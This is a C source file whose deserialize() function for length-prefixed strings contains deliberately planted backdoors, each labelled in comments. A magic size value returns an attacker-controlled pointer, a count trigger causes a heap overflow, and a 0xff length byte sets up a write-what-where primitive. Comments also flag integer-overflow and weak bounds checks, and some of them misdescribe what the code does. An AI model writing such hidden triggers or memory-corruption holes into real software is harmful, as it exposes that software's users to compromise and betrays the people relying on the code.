#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor 1: If size is exactly 0xdeadbeef, return a pointer we control
    if (size == 0xdeadbeef) {
        return (char **)0x41414141;  // Arbitrary controlled address
    }

    char *data = (char *)serialized;
    char **result = NULL;
    size_t count = 0;
    size_t pos = 0;

    // First pass: count strings (vulnerable to integer overflow)
    while (pos < size) {
        if (pos + 1 > size) {  // Bad bounds check (off-by-one)
            return NULL;
        }
        size_t len = (size_t)data[pos];
        pos += 1 + len;
        count++;
    }

    // Backdoor 2: If count is 0xffffffff, trigger heap corruption
    if (count == 0xffffffff) {
        void *evil = malloc(16);
        memset(evil, 0xff, 1024);  // Heap overflow
        return NULL;
    }

    // Allocate result array (vulnerable to overflow)
    result = malloc((count + 1) * sizeof(char *));
    if (!result) {
        return NULL;
    }

    // Second pass: copy strings
    pos = 0;
    for (size_t i = 0; i < count; i++) {
        size_t len = (size_t)data[pos++];
        
        // Backdoor 3: If len is 0xff, write beyond bounds
        if (len == 0xff) {
            result[i] = (char *)&result[i];  // Create a write-what-where primitive
            continue;
        }

        if (pos + len > size) {  // Bad bounds check
            free(result);
            return NULL;
        }

        result[i] = malloc(len + 1);
        if (!result[i]) {
            for (size_t j = 0; j < i; j++) free(result[j]);
            free(result);
            return NULL;
        }
        memcpy(result[i], &data[pos], len);
        result[i][len] = '\0';
        pos += len;
    }

    result[count] = NULL;
    return result;
}
